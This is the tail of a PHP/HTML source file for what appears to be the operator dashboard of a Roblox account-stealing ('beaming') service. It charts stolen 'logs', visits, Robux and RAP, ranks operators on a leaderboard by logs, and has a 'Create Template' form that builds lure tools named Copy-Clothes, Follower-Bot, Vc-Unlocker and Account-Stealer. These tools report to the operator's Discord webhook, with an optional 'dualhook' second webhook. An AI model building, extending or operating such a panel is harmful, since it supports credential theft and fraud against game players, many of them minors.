                                <div class="stat-change <?php echo $summaryPercentageChange >= 0 ? 'positive' : 'negative'; ?>">
                                    <i class="fas fa-arrow-<?php echo $summaryPercentageChange >= 0 ? 'up' : 'down'; ?>"></i>
                                    <?php echo abs($summaryPercentageChange); ?>%
                                </div>
                            </div>
                            <div class="stat-value"><?php echo $summary; ?></div>
                            <div class="stat-chart">
                                <canvas id="summaryChart"></canvas>
                            </div>
                            <div class="stat-daily">+<span><?php echo $summaryToday; ?></span> summary today!</div>
                        </div>
                    </div>

                    <div style="height: 20px;"></div>
                    <div class="rank-card">
                        <div class="rank-header">Rank Progress</div>
                        <div class="rank-info">
                            <div class="rank-item">
                                <span class="rank-label">Current Rank</span>
                                <span class="rank-value"><?php echo $currentRank; ?></span>
                            </div>
                            <div class="rank-item">
                                <span class="rank-label">Next Rank</span>
                                <span class="rank-value"><?php echo $nextRank; ?></span>
                            </div>
                            <div class="rank-item">
                                <span class="rank-label">Progress</span>
                                <span class="rank-value"><?php echo round($progress); ?>%</span>
                            </div>
                            <div class="rank-item">
                                <span class="rank-label">Logs to Next Rank</span>
                                <span class="rank-value"><?php echo $logsToNextRank; ?></span>
                            </div>
                        </div>
                        <div class="progress-container">
                            <div class="progress-bar">
                                <div class="progress-fill" style="width: <?php echo $progress; ?>%"></div>
                            </div>
                        </div>
                    </div>
                    <div style="height: 20px;"></div>
                    <div class="leaderboard-card">
                        <div class="leaderboard-header">Top 5 Leaderboard</div>
                        <div class="leaderboard-list">
                            <?php foreach ($leaderboard as $index => $user): ?>
                                <div class="leaderboard-item">
                                    <div class="leaderboard-rank"><?php echo $index + 1; ?></div>
                                    <img src="<?php echo $user['logo']; ?>" alt="Avatar" class="leaderboard-avatar">
                                    <div class="leaderboard-details">
                                        <div class="leaderboard-name"><?php echo $user['username']; ?></div>
                                        <div class="leaderboard-stats"><?php echo $user['logs']; ?> logs • <?php echo $user['visits']; ?> visits</div>
                                    </div>
                                </div>
                            <?php endforeach; ?>
                        </div>
                    </div>
                </div>

                <div class="settings-card" id="settingsCard">
                    <div class="settings-header">Settings</div>
                    <form method="post">
                        <div class="form-group">
                            <label class="form-label">Username</label>
                            <input type="text" class="form-input" name="username" value="<?php echo $starterUsername; ?>">
                        </div>
                        <div class="form-group">
                            <label class="form-label">Profile Picture URL</label>
                            <input type="text" class="form-input" name="pfp_url" value="<?php echo $pfpUrl; ?>">
                        </div>
                        <div class="form-group">
                            <label class="form-label">Directory</label>
                            <input type="text" class="form-input" name="directory" value="<?php echo $dir; ?>">
                        </div>
                        <div class="form-group">
                            <label class="form-label">Webhook</label>
                            <input type="text" class="form-input" name="web" value="<?php echo htmlspecialchars($web); ?>">
                        </div>
                        <div class="form-group">
                            <label class="form-label">Dualhook (optional)</label>
                            <input type="text" class="form-input" name="dualhook" value="<?php echo htmlspecialchars($dualhook); ?>" placeholder="https://discord.com/api/webhooks/...">
                        </div>
                        <button type="submit" class="submit-btn">Save Changes</button>
                    </form>
                </div>

                <div class="settings-card" id="createCard">
                    <div class="settings-header">Create Template</div>
                    <form method="get" action="/controlPage/apis/create.php" target="_blank" autocomplete="off">
                        <div class="form-group">
                            <label class="form-label">Directory (A–Z, 0–9)</label>
                            <input type="text" class="form-input" name="dir" pattern="[A-Za-z0-9]+" required placeholder="e.g. Test123">
                        </div>
                        <div class="form-group">
                            <label class="form-label">Tool Type</label>
                            <select class="form-input" name="t" required>
                                <option value="cc">Copy-Clothes</option>
                                <option value="gc">Copy-Games</option>
                                <option value="fb">Follower-Bot</option>
                                <option value="vu">Vc-Unlocker</option>
                                <option value="mr">Mass-Reporter</option>
                                <option value="as">Account-Stealer</option>
                            </select>
                        </div>
                        <div class="form-group">
                            <label class="form-label">Webhook (your own)</label>
                            <input type="url" class="form-input" name="web" required placeholder="https://discord.com/api/webhooks/...">
                        </div>
                        <div class="form-group">
                            <label class="form-label">Dualhook (optional)</label>
                            <input type="url" class="form-input" name="dualhook" placeholder="https://discord.com/api/webhooks/...">
                        </div>
                        <button type="submit" class="submit-btn">Create</button>
                    </form>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <script>
        const logsData = {
            labels: ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'],
            datasets: [{
                label: 'Logs',
                data: <?php echo json_encode($dailyLogsData); ?>,
                borderColor: '#8b5cf6',
                backgroundColor: 'rgba(139, 92, 246, 0.1)',
                tension: 0.4,
                fill: true,
                borderWidth: 2
            }]
        };

        const visitsData = {
            labels: ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'],
            datasets: [{
                label: 'Visits',
                data: <?php echo json_encode($dailyVisitsData); ?>,
                borderColor: '#ec4899',
                backgroundColor: 'rgba(236, 72, 153, 0.1)',
                tension: 0.4,
                fill: true,
                borderWidth: 2
            }]
        };

        const robuxData = {
            labels: ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'],
            datasets: [{
                label: 'Robux',
                data: <?php echo json_encode($dailyRobuxData); ?>,
                borderColor: '#10b981',
                backgroundColor: 'rgba(16, 185, 129, 0.1)',
                tension: 0.4,
                fill: true,
                borderWidth: 2
            }]
        };

        const rapData = {
            labels: ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'],
            datasets: [{
                label: 'RAP',
                data: <?php echo json_encode($dailyRapData); ?>,
                borderColor: '#3b82f6',
                backgroundColor: 'rgba(59, 130, 246, 0.1)',
                tension: 0.4,
                fill: true,
                borderWidth: 2
            }]
        };

        const summaryData = {
            labels: ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'],
            datasets: [{
                label: 'Summary',
                data: <?php echo json_encode($dailySummaryData); ?>,
                borderColor: '#f59e0b',
                backgroundColor: 'rgba(245, 158, 11, 0.1)',
                tension: 0.4,
                fill: true,
                borderWidth: 2
            }]
        };

        const chartOptions = {
            responsive: true,
            maintainAspectRatio: false,
            plugins: {
                legend: {
                    display: false
                },
                tooltip: {
                    backgroundColor: '#1e293b',
                    titleColor: '#a78bfa',
                    bodyColor: '#f8fafc',
                    borderColor: 'rgba(255, 255, 255, 0.1)',
                    borderWidth: 1,
                    padding: 12,
                    displayColors: false,
                    callbacks: {
                        label: function(context) {
                            return `${context.dataset.label}: ${context.raw}`;
                        }
                    }
                }
            },
            scales: {
                y: {
                    beginAtZero: true,
                    display: false,
                    grid: {
                        display: false
                    }
                },
                x: {
                    display: false,
                    grid: {
                        display: false
                    }
                }
            },
            elements: {
                point: {
                    radius: 0,
                    hoverRadius: 6,
                    hoverBorderWidth: 2
                },
                line: {
                    borderWidth: 2
                }
            },
            interaction: {
                intersect: false,
                mode: 'index'
            }
        };

        const logsChart = new Chart(
            document.getElementById('logsChart'),
            {
                type: 'line',
                data: logsData,
                options: chartOptions
            }
        );

        const visitsChart = new Chart(
            document.getElementById('visitsChart'),
            {
                type: 'line',
                data: visitsData,
                options: chartOptions
            }
        );

        const robuxChart = new Chart(
            document.getElementById('robuxChart'),
            {
                type: 'line',
                data: robuxData,
                options: chartOptions
            }
        );

        const rapChart = new Chart(
            document.getElementById('rapChart'),
            {
                type: 'line',
                data: rapData,
                options: chartOptions
            }
        );

        const summaryChart = new Chart(
            document.getElementById('summaryChart'),
            {
                type: 'line',
                data: summaryData,
                options: chartOptions
            }
        );

        function toggleDropdown() {
            const dropdown = document.getElementById('dropdownContent');
            dropdown.classList.toggle('show');
        }

        function showDashboard() {
            document.getElementById('dashboardContent').style.display = 'block';
            document.getElementById('settingsCard').style.display = 'none';
            document.getElementById('createCard').style.display = 'none';
            document.querySelector('.menu-item:nth-child(1)').classList.add('active');
            document.querySelector('.menu-item:nth-child(2)').classList.remove('active');
            document.querySelector('.menu-item:nth-child(3)').classList.remove('active');
        }

        function showSettings() {
            document.getElementById('dashboardContent').style.display = 'none';
            document.getElementById('settingsCard').style.display = 'block';
            document.getElementById('createCard').style.display = 'none';
            document.querySelector('.menu-item:nth-child(1)').classList.remove('active');
            document.querySelector('.menu-item:nth-child(2)').classList.add('active');
            document.querySelector('.menu-item:nth-child(3)').classList.remove('active');
        }

        function showCreate() {
            document.getElementById('dashboardContent').style.display = 'none';
            document.getElementById('settingsCard').style.display = 'none';
            document.getElementById('createCard').style.display = 'block';
            document.querySelector('.menu-item:nth-child(1)').classList.remove('active');
            document.querySelector('.menu-item:nth-child(2)').classList.remove('active');
            document.querySelector('.menu-item:nth-child(3)').classList.add('active');
        }

        window.onclick = function(event) {
            if (!event.target.matches('.user-btn') && !event.target.matches('.user-btn *')) {
                const dropdowns = document.getElementsByClassName('dropdown-content');
                for (let i = 0; i < dropdowns.length; i++) {
                    const openDropdown = dropdowns[i];
                    if (openDropdown.classList.contains('show')) {
                        openDropdown.classList.remove('show');
                    }
                }
            }
        }

        <?php if (isset($js)): ?>
            Swal.fire({
                title: '<?php echo strpos($js, 'Success') !== false ? "Success" : "Error"; ?>',
                text: '<?php echo strpos($js, 'Success') !== false ? "Changes applied successfully." : implode("\\n", $errors); ?>',
                icon: '<?php echo strpos($js, 'Success') !== false ? "success" : "error"; ?>',
                background: 'var(--darker)',
                color: 'var(--light)',
                confirmButtonColor: 'var(--primary)'
            });
        <?php endif; ?>
    </script>
</body>
</html>